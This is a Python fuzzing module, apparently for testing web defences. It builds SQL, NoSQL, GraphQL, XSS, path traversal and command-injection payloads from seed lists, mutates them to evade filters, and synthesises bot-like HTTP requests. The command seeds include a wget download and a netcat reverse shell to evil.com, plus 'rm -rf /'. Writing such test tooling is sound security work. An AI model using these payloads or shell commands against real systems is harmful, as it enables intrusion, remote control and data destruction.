"""
Fuzzing Engine — generates novel attack payloads.

Strategy
────────
  1. Seed corpus — a curated set of known attack templates
  2. Mutation engine — applies byte-level and structural mutations
  3. Generation engine — constructs novel payloads from grammar primitives
  4. Recombination — splices two existing payloads to produce hybrids

The engine is designed to produce 1000+ unique payloads per minute.
"""

from __future__ import annotations

import itertools
import random
import re
import string
import time
from dataclasses import dataclass
from enum import Enum
from typing import Iterator


class PayloadType(str, Enum):
    SQL_INJECTION = "sql_injection"
    NOSQL_INJECTION = "nosql_injection"
    GRAPHQL_INJECTION = "graphql_injection"
    XSS = "xss"
    PATH_TRAVERSAL = "path_traversal"
    COMMAND_INJECTION = "command_injection"
    DDOS_REQUEST = "ddos_request"


@dataclass
class AttackPayload:
    payload_type: PayloadType
    raw: str
    metadata: dict


# ---------------------------------------------------------------------------
# Seed corpus
# ---------------------------------------------------------------------------

_SQL_SEEDS = [
    "' OR '1'='1",
    "' OR '1'='1' --",
    "' OR '1'='1' /*",
    "' UNION SELECT NULL--",
    "' UNION SELECT NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL--",
    "1; DROP TABLE users--",
    "1'; EXEC xp_cmdshell('net user')--",
    "' AND SLEEP(5)--",
    "' AND BENCHMARK(1000000,MD5(1))--",
    "1 AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
    "' OR 1=1#",
    "admin'--",
    "' OR ''='",
    "') OR ('1'='1",
    "1' ORDER BY 3--",
    "1' GROUP BY 1--",
    "CHAR(49)+CHAR(32)+CHAR(79)+CHAR(82)+CHAR(32)+CHAR(49)+CHAR(61)+CHAR(49)",
    "0x27204f52203127 3d27 31",
    "' HAVING 1=1--",
    "' WAITFOR DELAY '0:0:5'--",
    "'; SHUTDOWN--",
    "1; SELECT * FROM information_schema.tables--",
    "' UNION ALL SELECT NULL,NULL,table_name FROM information_schema.tables--",
]

_NOSQL_SEEDS = [
    '{"$where": "1==1"}',
    '{"username": {"$ne": null}}',
    '{"password": {"$gt": ""}}',
    '{"$or": [{"a": 1}, {"b": 2}]}',
    '{"username": {"$regex": ".*"}}',
    '{"$where": "function() { return true; }"}',
    '{"username": {"$nin": []}}',
    '{"$where": "this.password.match(/.*/)"}',
]

_GRAPHQL_SEEDS = [
    "{__schema{types{name}}}",
    "{__type(name:\"User\"){fields{name type{name}}}}",
    "query{user(id:1){__typename id name email password}}",
    "{" + "a{" * 15 + "id" + "}" * 15 + "}",
    "query{users{edges{node{" * 5 + "id" + "}}}}" * 5,
]

_XSS_SEEDS = [
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>",
    "javascript:alert(1)",
    "<body onload=alert(1)>",
    "\"><script>alert(document.cookie)</script>",
    "';alert(String.fromCharCode(88,83,83))//",
    "<iframe src=javascript:alert(1)>",
    "<%00script>alert(1)</%00script>",
    "<scr<script>ipt>alert(1)</scr</script>ipt>",
]

_PATH_TRAVERSAL_SEEDS = [
    "../../../etc/passwd",
    "..%2F..%2F..%2Fetc%2Fpasswd",
    "..%252F..%252F..%252Fetc%252Fpasswd",
    "....//....//....//etc/passwd",
    "%2e%2e/%2e%2e/%2e%2e/etc/passwd",
    "..\\..\\..\\windows\\system32\\cmd.exe",
    "%00/../etc/passwd",
]

_COMMAND_SEEDS = [
    "; ls -la",
    "| cat /etc/passwd",
    "&& rm -rf /",
    "`id`",
    "$(whoami)",
    "; wget http://evil.com/shell.sh -O /tmp/shell.sh",
    "| nc -e /bin/bash evil.com 4444",
]

_SEED_MAP: dict[PayloadType, list[str]] = {
    PayloadType.SQL_INJECTION: _SQL_SEEDS,
    PayloadType.NOSQL_INJECTION: _NOSQL_SEEDS,
    PayloadType.GRAPHQL_INJECTION: _GRAPHQL_SEEDS,
    PayloadType.XSS: _XSS_SEEDS,
    PayloadType.PATH_TRAVERSAL: _PATH_TRAVERSAL_SEEDS,
    PayloadType.COMMAND_INJECTION: _COMMAND_SEEDS,
}

# DDoS request templates are built structurally, not from seeds
_HTTP_METHODS = ["GET", "POST", "HEAD", "OPTIONS", "PUT", "DELETE"]
_SUSPICIOUS_PATHS = [
    "/admin", "/wp-admin", "/.env", "/config.php", "/api/v1/users",
    "/api/internal", "/metrics", "/actuator", "/debug",
]


# ---------------------------------------------------------------------------
# Mutation operators
# ---------------------------------------------------------------------------

def _mutate_case(payload: str) -> str:
    """Randomly change case of alphabetic chars."""
    return "".join(
        c.upper() if random.random() < 0.4 else c.lower() for c in payload
    )


def _mutate_encode(payload: str) -> str:
    """URL-encode a random subset of characters."""
    result = []
    for c in payload:
        if c.isalpha() and random.random() < 0.3:
            result.append(f"%{ord(c):02X}")
        else:
            result.append(c)
    return "".join(result)


def _mutate_double_encode(payload: str) -> str:
    """Double URL-encode a random subset."""
    result = []
    for c in payload:
        if c.isalpha() and random.random() < 0.2:
            result.append(f"%25{ord(c):02X}")
        else:
            result.append(c)
    return "".join(result)


def _mutate_comment_insertion(payload: str) -> str:
    """Insert SQL comments in random positions (SQL evasion)."""
    words = payload.split(" ")
    mutated = []
    for word in words:
        mutated.append(word)
        if random.random() < 0.3:
            mutated.append("/**/")
    return " ".join(mutated)


def _mutate_whitespace(payload: str) -> str:
    """Replace spaces with alternative whitespace."""
    alternatives = ["\t", "\n", "\r", "/**/", "+", "%20", "%09"]
    return re.sub(
        r" ", lambda m: random.choice(alternatives), payload
    )


def _mutate_null_inject(payload: str) -> str:
    """Insert null bytes."""
    idx = random.randint(0, max(len(payload) - 1, 0))
    return payload[:idx] + "%00" + payload[idx:]


def _mutate_insert_junk(payload: str) -> str:
    """Append random junk to evade length-based heuristics."""
    junk = "".join(random.choices(string.ascii_letters + string.digits, k=8))
    return payload + junk


_MUTATIONS = [
    _mutate_case,
    _mutate_encode,
    _mutate_double_encode,
    _mutate_comment_insertion,
    _mutate_whitespace,
    _mutate_null_inject,
    _mutate_insert_junk,
]


def _mutate(payload: str, n_mutations: int = 2) -> str:
    """Apply n random mutations to a payload."""
    for _ in range(n_mutations):
        mutation = random.choice(_MUTATIONS)
        payload = mutation(payload)
    return payload


# ---------------------------------------------------------------------------
# DDoS request generation
# ---------------------------------------------------------------------------

def _generate_ddos_request() -> dict:
    """Generate a synthetic HTTP request dict representing bot/DDoS traffic."""
    method = random.choice(_HTTP_METHODS)
    path = random.choice(_SUSPICIOUS_PATHS)
    now = time.time()
    # Simulate a bot: very regular inter-arrival times
    n_prev = random.randint(50, 200)
    interval = random.uniform(0.001, 0.01)  # very fast
    prev_ts = [now - i * interval for i in range(n_prev, 0, -1)]

    return {
        "method": method,
        "path": path,
        "query_string": "",
        "headers": {
            "User-Agent": random.choice([
                "python-requests/2.28",
                "curl/7.68",
                "Go-http-client/1.1",
                "bot/1.0",
                "",  # missing UA
            ]),
        },
        "body": b"",
        "client_ip": f"10.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}",
        "timestamp": now,
        "prev_timestamps": prev_ts,
    }


# ---------------------------------------------------------------------------
# Main fuzzer class
# ---------------------------------------------------------------------------

class FuzzingEngine:
    """
    Generates novel attack payloads at high throughput.

    Usage::

        engine = FuzzingEngine(seed=42)
        for payload in engine.generate(count=1000):
            print(payload.payload_type, payload.raw[:80])
    """

    def __init__(self, seed: int | None = None):
        if seed is not None:
            random.seed(seed)
        self._counter = itertools.count(1)

    def generate(self, count: int = 1000) -> list[AttackPayload]:
        """Generate ``count`` attack payloads."""
        payloads = []
        for _ in range(count):
            payload = self._generate_one()
            payloads.append(payload)
        return payloads

    def generate_stream(self) -> Iterator[AttackPayload]:
        """Infinite generator — yields payloads as fast as possible."""
        while True:
            yield self._generate_one()

    def generate_per_minute(self, target_ppm: int = 1000) -> list[AttackPayload]:
        """
        Generate approximately ``target_ppm`` payloads in 60 seconds.
        Returns the list immediately (non-blocking); callers control timing.
        """
        return self.generate(count=target_ppm)

    # ------------------------------------------------------------------
    # Internal
    # ------------------------------------------------------------------

    def _generate_one(self) -> AttackPayload:
        n = next(self._counter)
        strategy = n % 4

        if strategy == 0:
            return self._from_seed()
        if strategy == 1:
            return self._by_mutation()
        if strategy == 2:
            return self._by_recombination()
        return self._synthetic_ddos()

    def _from_seed(self) -> AttackPayload:
        ptype = random.choice(list(_SEED_MAP.keys()))
        seeds = _SEED_MAP[ptype]
        raw = random.choice(seeds)
        return AttackPayload(
            payload_type=ptype,
            raw=raw,
            metadata={"strategy": "seed"},
        )

    def _by_mutation(self) -> AttackPayload:
        ptype = random.choice(list(_SEED_MAP.keys()))
        seeds = _SEED_MAP[ptype]
        base = random.choice(seeds)
        mutated = _mutate(base, n_mutations=random.randint(1, 3))
        return AttackPayload(
            payload_type=ptype,
            raw=mutated,
            metadata={"strategy": "mutation", "base": base[:40]},
        )

    def _by_recombination(self) -> AttackPayload:
        ptype = random.choice(list(_SEED_MAP.keys()))
        seeds = _SEED_MAP[ptype]
        if len(seeds) < 2:
            return self._by_mutation()
        a, b = random.sample(seeds, 2)
        split_a = random.randint(1, max(len(a) - 1, 1))
        split_b = random.randint(1, max(len(b) - 1, 1))
        hybrid = a[:split_a] + b[split_b:]
        return AttackPayload(
            payload_type=ptype,
            raw=hybrid,
            metadata={"strategy": "recombination"},
        )

    def _synthetic_ddos(self) -> AttackPayload:
        req = _generate_ddos_request()
        return AttackPayload(
            payload_type=PayloadType.DDOS_REQUEST,
            raw=str(req),
            metadata={"strategy": "synthetic", "request": req},
        )
